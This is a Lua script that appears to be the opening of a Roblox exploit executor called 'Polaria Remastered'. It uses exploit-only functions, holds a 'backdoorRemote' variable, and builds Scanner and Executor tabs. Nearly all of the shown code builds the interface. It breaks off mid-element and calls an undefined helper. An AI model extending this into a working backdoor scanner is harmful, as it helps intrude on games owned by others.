if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Shared = (type(getgenv) == "function" and getgenv()) or shared or _G

local function GetService(Service)
    local Service = game:GetService(Service)
    return cloneref and cloneref(Service) or Service
end

local Hui = gethui and gethui() or GetService("CoreGui")
local TweenService = GetService("TweenService")
local Players = GetService("Players")
local Player = Players.LocalPlayer
local RunService = GetService("RunService")
local HttpService = GetService("HttpService")
local UserInputService = GetService("UserInputService")
local Stats = GetService("Stats")
local ReplicatedStorage = GetService("ReplicatedStorage")
local MarketplaceService = GetService("MarketplaceService")
local StarterGui = GetService("StarterGui")

local function Tween(Object, Speed, Props, Style, Dir)
    return TweenService:Create(
        Object,
        TweenInfo.new(
            Speed,
            Enum.EasingStyle[Style or "Quad"],
            Enum.EasingDirection[Dir or "Out"]
        ),
        Props
    )
end

local WriteFile = expect("function", writefile, function() return end)
local IsFile = expect("function", isfile, function() return end)
local IsFolder = expect("function", isfolder, function() return end)
local MakeFolder = expect("function", makefolder, function() return end)
local LoadAsset = expect("function", getcustomasset, expect("function", getsynasset, nil))

local Assets = {
    ["PolariaRM/Assets/polaria_logo.png"] = "https://raw.githubusercontent.com/JustSomeGuest/Scripts/Main/Universal/PolariaRM/Assets/logo.png",
    ["PolariaRM/Assets/polaria_dev.png"] = "https://avatars.githubusercontent.com/u/279942568",
    ["PolariaRM/Assets/polaria_shadow.png"] = "rbxassetid://15298624572",
}

local function HttpGet(url)
    local RequestFunc = expect("function", syn and syn.request, 
        expect("function", request, 
            expect("function", http_request, nil)))
    
    if not RequestFunc then
        return nil
    end
    
    local success, result = pcall(function()
        return RequestFunc({
            Url = url,
            Method = "GET"
        })
    end)
    
    return success and result or nil
end

local function GetAsset(Path)
    if not LoadAsset then
        return nil
    end

    local Asset = Assets[Path]
    if not Asset then
        return nil
    end

    if not IsFolder("PolariaRM") then
        MakeFolder("PolariaRM")
    end

    if not IsFolder("PolariaRM/Assets") then
        MakeFolder("PolariaRM/Assets")
    end

    if Asset:match("^rbxassetid://") then
        return Asset
    end

    if not IsFile(Path) then
        local Success, Response = pcall(function()
            return HttpGet(Asset)
        end)

        if not Success or not Response or not Response.Success or not Response.Body then
            return nil
        end

        WriteFile(Path, Response.Body)
    end

    return LoadAsset(Path)
end

Shared.PolariaRM = Shared.PolariaRM or {}

if Shared.PolariaRM.isLoaded then
    StarterGui:SetCore("SendNotification", {
        Title = "PolariaRM",
        Text = "Polaria Remastered is already running!",
        Icon = GetAsset("PolariaRM/Assets/polaria_logo.png"),
        Duration = 4
    })
    return
end

Shared.PolariaRM.isLoaded = true

local backdoorRemote = nil
local currentContent = nil
local lastDT = 0
local serverStartTime = workspace:GetServerTimeNow()

local UI = {}
UI["ScreenGui"] = Instance.new("ScreenGui")
UI["ScreenGui"]["Name"] = "PolariaRM"
UI["ScreenGui"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
UI["ScreenGui"]["ResetOnSpawn"] = false
UI["ScreenGui"]["Parent"] = Hui

UI["Show"] = Instance.new("ImageButton")
UI["Show"]["Name"] = "Show"
UI["Show"]["BorderSizePixel"] = 0
UI["Show"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["Show"]["Size"] = UDim2.new(0, 40, 0, 40)
UI["Show"]["Visible"] = true
UI["Show"]["Position"] = UDim2.new(0, 20, 0, 6)
UI["Show"]["Parent"] = UI["ScreenGui"]

UI["ShowIcon"] = Instance.new("ImageLabel")
UI["ShowIcon"]["Image"] = GetAsset("PolariaRM/Assets/polaria_logo.png")
UI["ShowIcon"]["ImageColor3"] = Color3.fromRGB(255, 255, 255)
UI["ShowIcon"]["BackgroundTransparency"] = 1
UI["ShowIcon"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ShowIcon"]["Position"] = UDim2.new(0, 0, 0, 0)
UI["ShowIcon"]["Parent"] = UI["Show"]

UI["ShowIconGradient"] = Instance.new("UIGradient")
UI["ShowIconGradient"]["Name"] = "ShowGradient"
UI["ShowIconGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ShowIconGradient"]["Parent"] = UI["ShowIcon"]

UI["ShowStroke"] = Instance.new("UIStroke")
UI["ShowStroke"]["Name"] = "ShowStroke"
UI["ShowStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["ShowStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["ShowStroke"]["Parent"] = UI["Show"]

UI["ShowStrokeGradient"] = Instance.new("UIGradient")
UI["ShowStrokeGradient"]["Name"] = "ShowStrokeGradient"
UI["ShowStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ShowStrokeGradient"]["Parent"] = UI["ShowStroke"]

UI["ShowCorner"] = Instance.new("UICorner")
UI["ShowCorner"]["Name"] = "ShowCorner"
UI["ShowCorner"]["CornerRadius"] = UDim.new(1, 0)
UI["ShowCorner"]["Parent"] = UI["Show"]

UI["ShowGradient"] = Instance.new("UIGradient")
UI["ShowGradient"]["Name"] = "ShowGradient"
UI["ShowGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ShowGradient"]["Parent"] = UI["Show"]

UI["ShowPadding"] = Instance.new("UIPadding")
UI["ShowPadding"]["Name"] = "ShowPadding"
UI["ShowPadding"]["PaddingTop"] = UDim.new(0, 5)
UI["ShowPadding"]["PaddingRight"] = UDim.new(0, 5)
UI["ShowPadding"]["PaddingLeft"] = UDim.new(0, 5)
UI["ShowPadding"]["PaddingBottom"] = UDim.new(0, 5)
UI["ShowPadding"]["Parent"] = UI["Show"]

UI["Container"] = Instance.new("Frame")
UI["Container"]["Name"] = "Container"
UI["Container"]["BorderSizePixel"] = 0
UI["Container"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["Container"]["Size"] = UDim2.new(0.7, 0, 0.9, 0)
UI["Container"]["Position"] = UDim2.new(0.5, -UI["Container"]["Size"].X.Offset/2, 0.5, -UI["Container"]["Size"].Y.Offset/2)
UI["Container"]["AnchorPoint"] = Vector2.new(0.5, 0.5)
UI["Container"]["BackgroundTransparency"] = 1
UI["Container"]["Visible"] = false
UI["Container"]["Parent"] = UI["ScreenGui"]

UI["Shadow"] = Instance.new("ImageLabel")
UI["Shadow"]["Name"] = "Shadow"
UI["Shadow"]["BorderSizePixel"] = 0
UI["Shadow"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["Shadow"]["ImageTransparency"] = 0.2
UI["Shadow"]["AnchorPoint"] = Vector2.new(0.5, 0.5)
UI["Shadow"]["Image"] = GetAsset("PolariaRM/Assets/polaria_shadow.png")
UI["Shadow"]["Size"] = UDim2.new(1.059, 0, 1.088, 0)
UI["Shadow"]["BackgroundTransparency"] = 1
UI["Shadow"]["Position"] = UDim2.new(0.5, 0, 0.5, 0)
UI["Shadow"]["Parent"] = UI["Container"]

UI["MainFrame"] = Instance.new("Frame")
UI["MainFrame"]["Name"] = "MainFrame"
UI["MainFrame"]["BorderSizePixel"] = 0
UI["MainFrame"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["MainFrame"]["AnchorPoint"] = Vector2.new(0.5, 0.5)
UI["MainFrame"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["MainFrame"]["Position"] = UDim2.new(0.5, 0, 0.5, 0)
UI["MainFrame"]["Parent"] = UI["Container"]

UI["MainFramePadding"] = Instance.new("UIPadding")
UI["MainFramePadding"]["Name"] = "MainFramePadding"
UI["MainFramePadding"]["PaddingTop"] = UDim.new(0, 4)
UI["MainFramePadding"]["PaddingRight"] = UDim.new(0, 4)
UI["MainFramePadding"]["PaddingLeft"] = UDim.new(0, 4)
UI["MainFramePadding"]["PaddingBottom"] = UDim.new(0, 4)
UI["MainFramePadding"]["Parent"] = UI["MainFrame"]

UI["MainFrameStroke"] = Instance.new("UIStroke")
UI["MainFrameStroke"]["Name"] = "MainFrameStroke"
UI["MainFrameStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["MainFrameStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["MainFrameStroke"]["Parent"] = UI["MainFrame"]

UI["MainFrameStrokeGradient"] = Instance.new("UIGradient")
UI["MainFrameStrokeGradient"]["Name"] = "MainFrameStrokeGradient"
UI["MainFrameStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["MainFrameStrokeGradient"]["Parent"] = UI["MainFrameStroke"]

UI["MainFrameGradient"] = Instance.new("UIGradient")
UI["MainFrameGradient"]["Name"] = "MainFrameGradient"
UI["MainFrameGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["MainFrameGradient"]["Parent"] = UI["MainFrame"]

UI["MainFrameCorner"] = Instance.new("UICorner")
UI["MainFrameCorner"]["Name"] = "MainFrameCorner"
UI["MainFrameCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["MainFrameCorner"]["Parent"] = UI["MainFrame"]

UI["Topbar"] = Instance.new("Frame")
UI["Topbar"]["Name"] = "Topbar"
UI["Topbar"]["BorderSizePixel"] = 0
UI["Topbar"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["Topbar"]["Size"] = UDim2.new(1, 0, 0, 30)
UI["Topbar"]["LayoutOrder"] = 1
UI["Topbar"]["BackgroundTransparency"] = 1
UI["Topbar"]["Parent"] = UI["MainFrame"]

UI["TopbarSC"] = Instance.new("UISizeConstraint")
UI["TopbarSC"]["Name"] = "TopbarSC"
UI["TopbarSC"]["MinSize"] = Vector2.new(0, 30)
UI["TopbarSC"]["MaxSize"] = Vector2.new(math.huge, 34)
UI["TopbarSC"]["Parent"] = UI["Topbar"]

UI["Title"] = Instance.new("TextLabel")
UI["Title"]["Name"] = "Title"
UI["Title"]["TextWrapped"] = true
UI["Title"]["BorderSizePixel"] = 0
UI["Title"]["TextXAlignment"] = Enum.TextXAlignment.Left
UI["Title"]["TextScaled"] = true
UI["Title"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["Title"]["FontFace"] = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["Title"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["Title"]["BackgroundTransparency"] = 1
UI["Title"]["Size"] = UDim2.new(0, 486, 0, 30)
UI["Title"]["Text"] = "Polaria Remastered"
UI["Title"]["LayoutOrder"] = 1
UI["Title"]["Parent"] = UI["Topbar"]

UI["TitleGradient"] = Instance.new("UIGradient")
UI["TitleGradient"]["Name"] = "TitleGradient"
UI["TitleGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["TitleGradient"]["Parent"] = UI["Title"]

UI["TopbarList"] = Instance.new("UIListLayout")
UI["TopbarList"]["Name"] = "TopbarList"
UI["TopbarList"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill
UI["TopbarList"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill
UI["TopbarList"]["Padding"] = UDim.new(0, 4)
UI["TopbarList"]["SortOrder"] = Enum.SortOrder.LayoutOrder
UI["TopbarList"]["FillDirection"] = Enum.FillDirection.Horizontal
UI["TopbarList"]["Parent"] = UI["Topbar"]

UI["TopbarButtons"] = Instance.new("Frame")
UI["TopbarButtons"]["Name"] = "TopbarButtons"
UI["TopbarButtons"]["BorderSizePixel"] = 0
UI["TopbarButtons"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["TopbarButtons"]["AutomaticSize"] = Enum.AutomaticSize.X
UI["TopbarButtons"]["Size"] = UDim2.new(0, 0, 0, 10)
UI["TopbarButtons"]["Position"] = UDim2.new(0, 528, 0, 0)
UI["TopbarButtons"]["LayoutOrder"] = 2
UI["TopbarButtons"]["BackgroundTransparency"] = 1
UI["TopbarButtons"]["Parent"] = UI["Topbar"]

UI["TopbarButtonsSC"] = Instance.new("UISizeConstraint")
UI["TopbarButtonsSC"]["Name"] = "TopbarButtonsSC"
UI["TopbarButtonsSC"]["MinSize"] = Vector2.new(68, 0)
UI["TopbarButtonsSC"]["MaxSize"] = Vector2.new(72, math.huge)
UI["TopbarButtonsSC"]["Parent"] = UI["TopbarButtons"]

UI["TopbarButtonsList"] = Instance.new("UIListLayout")
UI["TopbarButtonsList"]["Name"] = "TopbarButtonsList"
UI["TopbarButtonsList"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Right
UI["TopbarButtonsList"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill
UI["TopbarButtonsList"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill
UI["TopbarButtonsList"]["Padding"] = UDim.new(0, 4)
UI["TopbarButtonsList"]["VerticalAlignment"] = Enum.VerticalAlignment.Center
UI["TopbarButtonsList"]["SortOrder"] = Enum.SortOrder.LayoutOrder
UI["TopbarButtonsList"]["FillDirection"] = Enum.FillDirection.Horizontal
UI["TopbarButtonsList"]["Parent"] = UI["TopbarButtons"]

UI["Hide"] = Instance.new("TextButton")
UI["Hide"]["Name"] = "Hide"
UI["Hide"]["TextWrapped"] = true
UI["Hide"]["BorderSizePixel"] = 0
UI["Hide"]["TextScaled"] = true
UI["Hide"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["Hide"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["Hide"]["FontFace"] = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["Hide"]["BackgroundTransparency"] = 1
UI["Hide"]["Size"] = UDim2.new(0, 32, 0, 32)
UI["Hide"]["LayoutOrder"] = 1
UI["Hide"]["Text"] = "-"
UI["Hide"]["Parent"] = UI["TopbarButtons"]

UI["HideCorner"] = Instance.new("UICorner")
UI["HideCorner"]["Name"] = "HideCorner"
UI["HideCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["HideCorner"]["Parent"] = UI["Hide"]

UI["HideGradient"] = Instance.new("UIGradient")
UI["HideGradient"]["Name"] = "HideGradient"
UI["HideGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["HideGradient"]["Parent"] = UI["Hide"]

UI["Close"] = Instance.new("TextButton")
UI["Close"]["Name"] = "Close"
UI["Close"]["TextWrapped"] = true
UI["Close"]["BorderSizePixel"] = 0
UI["Close"]["TextScaled"] = true
UI["Close"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["Close"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["Close"]["FontFace"] = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["Close"]["BackgroundTransparency"] = 1
UI["Close"]["Size"] = UDim2.new(0, 32, 0, 32)
UI["Close"]["LayoutOrder"] = 2
UI["Close"]["Text"] = "X"
UI["Close"]["Parent"] = UI["TopbarButtons"]

UI["CloseCorner"] = Instance.new("UICorner")
UI["CloseCorner"]["Name"] = "CloseCorner"
UI["CloseCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["CloseCorner"]["Parent"] = UI["Close"]

UI["CloseGradient"] = Instance.new("UIGradient")
UI["CloseGradient"]["Name"] = "CloseGradient"
UI["CloseGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["CloseGradient"]["Parent"] = UI["Close"]

UI["Tabs"] = Instance.new("Frame")
UI["Tabs"]["Name"] = "Tabs"
UI["Tabs"]["BorderSizePixel"] = 0
UI["Tabs"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["Tabs"]["Size"] = UDim2.new(1, 0, 0, 34)
UI["Tabs"]["LayoutOrder"] = 2
UI["Tabs"]["BackgroundTransparency"] = 1
UI["Tabs"]["Parent"] = UI["MainFrame"]

UI["TabsSC"] = Instance.new("UISizeConstraint")
UI["TabsSC"]["Name"] = "TabsSC"
UI["TabsSC"]["MinSize"] = Vector2.new(0, 32)
UI["TabsSC"]["MaxSize"] = Vector2.new(math.huge, 36)
UI["TabsSC"]["Parent"] = UI["Tabs"]

UI["TabsList"] = Instance.new("UIListLayout")
UI["TabsList"]["Name"] = "TabsList"
UI["TabsList"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["TabsList"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill
UI["TabsList"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill
UI["TabsList"]["Padding"] = UDim.new(0, 6)
UI["TabsList"]["VerticalAlignment"] = Enum.VerticalAlignment.Center
UI["TabsList"]["SortOrder"] = Enum.SortOrder.LayoutOrder
UI["TabsList"]["FillDirection"] = Enum.FillDirection.Horizontal
UI["TabsList"]["Parent"] = UI["Tabs"]

UI["HomeTab"] = Instance.new("TextButton")
UI["HomeTab"]["Name"] = "HomeTab"
UI["HomeTab"]["TextWrapped"] = true
UI["HomeTab"]["BorderSizePixel"] = 0
UI["HomeTab"]["TextScaled"] = true
UI["HomeTab"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["HomeTab"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["HomeTab"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["HomeTab"]["BackgroundTransparency"] = 1
UI["HomeTab"]["Size"] = UDim2.new(0, 32, 0, 32)
UI["HomeTab"]["LayoutOrder"] = 1
UI["HomeTab"]["Text"] = "Home"
UI["HomeTab"]["Parent"] = UI["Tabs"]

UI["HomeTabCorner"] = Instance.new("UICorner")
UI["HomeTabCorner"]["Name"] = "HomeTabCorner"
UI["HomeTabCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["HomeTabCorner"]["Parent"] = UI["HomeTab"]

UI["HomeTabGradient"] = Instance.new("UIGradient")
UI["HomeTabGradient"]["Name"] = "HomeTabGradient"
UI["HomeTabGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["HomeTabGradient"]["Parent"] = UI["HomeTab"]

UI["HomeTabStroke"] = Instance.new("UIStroke")
UI["HomeTabStroke"]["Name"] = "HomeTabStroke"
UI["HomeTabStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["HomeTabStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["HomeTabStroke"]["Parent"] = UI["HomeTab"]

UI["HomeTabStrokeGradient"] = Instance.new("UIGradient")
UI["HomeTabStrokeGradient"]["Name"] = "HomeTabStrokeGradient"
UI["HomeTabStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["HomeTabStrokeGradient"]["Parent"] = UI["HomeTabStroke"]

UI["HomeTabPadding"] = Instance.new("UIPadding")
UI["HomeTabPadding"]["Name"] = "HomeTabPadding"
UI["HomeTabPadding"]["PaddingTop"] = UDim.new(0, 2)
UI["HomeTabPadding"]["PaddingRight"] = UDim.new(0, 4)
UI["HomeTabPadding"]["PaddingLeft"] = UDim.new(0, 4)
UI["HomeTabPadding"]["PaddingBottom"] = UDim.new(0, 2)
UI["HomeTabPadding"]["Parent"] = UI["HomeTab"]

UI["ScanTab"] = Instance.new("TextButton")
UI["ScanTab"]["Name"] = "ScanTab"
UI["ScanTab"]["TextWrapped"] = true
UI["ScanTab"]["BorderSizePixel"] = 0
UI["ScanTab"]["TextScaled"] = true
UI["ScanTab"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ScanTab"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["ScanTab"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["ScanTab"]["BackgroundTransparency"] = 1
UI["ScanTab"]["Size"] = UDim2.new(0, 32, 0, 32)
UI["ScanTab"]["LayoutOrder"] = 2
UI["ScanTab"]["Text"] = "Scanner"
UI["ScanTab"]["Parent"] = UI["Tabs"]

UI["ScanTabGradient"] = Instance.new("UIGradient")
UI["ScanTabGradient"]["Name"] = "ScanTabGradient"
UI["ScanTabGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ScanTabGradient"]["Parent"] = UI["ScanTab"]

UI["ScanTabCorner"] = Instance.new("UICorner")
UI["ScanTabCorner"]["Name"] = "ScanTabCorner"
UI["ScanTabCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["ScanTabCorner"]["Parent"] = UI["ScanTab"]

UI["ScanTabStroke"] = Instance.new("UIStroke")
UI["ScanTabStroke"]["Name"] = "ScanTabStroke"
UI["ScanTabStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["ScanTabStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["ScanTabStroke"]["Parent"] = UI["ScanTab"]

UI["ScanTabStrokeGradient"] = Instance.new("UIGradient")
UI["ScanTabStrokeGradient"]["Name"] = "ScanTabStrokeGradient"
UI["ScanTabStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ScanTabStrokeGradient"]["Parent"] = UI["ScanTabStroke"]

UI["ScanTabPadding"] = Instance.new("UIPadding")
UI["ScanTabPadding"]["Name"] = "ScanTabPadding"
UI["ScanTabPadding"]["PaddingTop"] = UDim.new(0, 2)
UI["ScanTabPadding"]["PaddingRight"] = UDim.new(0, 4)
UI["ScanTabPadding"]["PaddingLeft"] = UDim.new(0, 4)
UI["ScanTabPadding"]["PaddingBottom"] = UDim.new(0, 2)
UI["ScanTabPadding"]["Parent"] = UI["ScanTab"]

UI["ScriptsTab"] = Instance.new("TextButton")
UI["ScriptsTab"]["Name"] = "ScriptsTab"
UI["ScriptsTab"]["TextWrapped"] = true
UI["ScriptsTab"]["BorderSizePixel"] = 0
UI["ScriptsTab"]["TextScaled"] = true
UI["ScriptsTab"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ScriptsTab"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["ScriptsTab"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["ScriptsTab"]["BackgroundTransparency"] = 1
UI["ScriptsTab"]["Size"] = UDim2.new(0, 32, 0, 32)
UI["ScriptsTab"]["LayoutOrder"] = 3
UI["ScriptsTab"]["Text"] = "Scripts"
UI["ScriptsTab"]["Parent"] = UI["Tabs"]

UI["ScriptsTabStroke"] = Instance.new("UIStroke")
UI["ScriptsTabStroke"]["Name"] = "ScriptsTabStroke"
UI["ScriptsTabStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["ScriptsTabStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["ScriptsTabStroke"]["Parent"] = UI["ScriptsTab"]

UI["ScriptsTabStrokeGradient"] = Instance.new("UIGradient")
UI["ScriptsTabStrokeGradient"]["Name"] = "ScriptsTabStrokeGradient"
UI["ScriptsTabStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ScriptsTabStrokeGradient"]["Parent"] = UI["ScriptsTabStroke"]

UI["ScriptsTabGradient"] = Instance.new("UIGradient")
UI["ScriptsTabGradient"]["Name"] = "ScriptsTabGradient"
UI["ScriptsTabGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ScriptsTabGradient"]["Parent"] = UI["ScriptsTab"]

UI["ScriptsTabCorner"] = Instance.new("UICorner")
UI["ScriptsTabCorner"]["Name"] = "ScriptsTabCorner"
UI["ScriptsTabCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["ScriptsTabCorner"]["Parent"] = UI["ScriptsTab"]

UI["ScriptsTabPadding"] = Instance.new("UIPadding")
UI["ScriptsTabPadding"]["Name"] = "ScriptsTabPadding"
UI["ScriptsTabPadding"]["PaddingTop"] = UDim.new(0, 2)
UI["ScriptsTabPadding"]["PaddingRight"] = UDim.new(0, 4)
UI["ScriptsTabPadding"]["PaddingLeft"] = UDim.new(0, 4)
UI["ScriptsTabPadding"]["PaddingBottom"] = UDim.new(0, 2)
UI["ScriptsTabPadding"]["Parent"] = UI["ScriptsTab"]

UI["ExeTab"] = Instance.new("TextButton")
UI["ExeTab"]["Name"] = "ExeTab"
UI["ExeTab"]["TextWrapped"] = true
UI["ExeTab"]["BorderSizePixel"] = 0
UI["ExeTab"]["TextScaled"] = true
UI["ExeTab"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ExeTab"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["ExeTab"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["ExeTab"]["BackgroundTransparency"] = 1
UI["ExeTab"]["Size"] = UDim2.new(0, 32, 0, 32)
UI["ExeTab"]["LayoutOrder"] = 4
UI["ExeTab"]["Text"] = "Executor"
UI["ExeTab"]["Parent"] = UI["Tabs"]

UI["ExeTabCorner"] = Instance.new("UICorner")
UI["ExeTabCorner"]["Name"] = "ExeTabCorner"
UI["ExeTabCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["ExeTabCorner"]["Parent"] = UI["ExeTab"]

UI["ExeTabStroke"] = Instance.new("UIStroke")
UI["ExeTabStroke"]["Name"] = "ExeTabStroke"
UI["ExeTabStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["ExeTabStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["ExeTabStroke"]["Parent"] = UI["ExeTab"]

UI["ExeTabStrokeGradient"] = Instance.new("UIGradient")
UI["ExeTabStrokeGradient"]["Name"] = "ExeTabStrokeGradient"
UI["ExeTabStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ExeTabStrokeGradient"]["Parent"] = UI["ExeTabStroke"]

UI["ExeTabGradient"] = Instance.new("UIGradient")
UI["ExeTabGradient"]["Name"] = "ExeTabGradient"
UI["ExeTabGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["ExeTabGradient"]["Parent"] = UI["ExeTab"]

UI["ExeTabPadding"] = Instance.new("UIPadding")
UI["ExeTabPadding"]["Name"] = "ExeTabPadding"
UI["ExeTabPadding"]["PaddingTop"] = UDim.new(0, 2)
UI["ExeTabPadding"]["PaddingRight"] = UDim.new(0, 4)
UI["ExeTabPadding"]["PaddingLeft"] = UDim.new(0, 4)
UI["ExeTabPadding"]["PaddingBottom"] = UDim.new(0, 2)
UI["ExeTabPadding"]["Parent"] = UI["ExeTab"]

UI["CreditsTab"] = Instance.new("TextButton")
UI["CreditsTab"]["Name"] = "CreditsTab"
UI["CreditsTab"]["TextWrapped"] = true
UI["CreditsTab"]["BorderSizePixel"] = 0
UI["CreditsTab"]["TextScaled"] = true
UI["CreditsTab"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["CreditsTab"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["CreditsTab"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["CreditsTab"]["BackgroundTransparency"] = 1
UI["CreditsTab"]["Size"] = UDim2.new(0, 32, 0, 32)
UI["CreditsTab"]["LayoutOrder"] = 5
UI["CreditsTab"]["Text"] = "Credits"
UI["CreditsTab"]["Parent"] = UI["Tabs"]

UI["CreditsTabCorner"] = Instance.new("UICorner")
UI["CreditsTabCorner"]["Name"] = "CreditsTabCorner"
UI["CreditsTabCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["CreditsTabCorner"]["Parent"] = UI["CreditsTab"]

UI["CreditsTabStroke"] = Instance.new("UIStroke")
UI["CreditsTabStroke"]["Name"] = "CreditsTabStroke"
UI["CreditsTabStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["CreditsTabStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
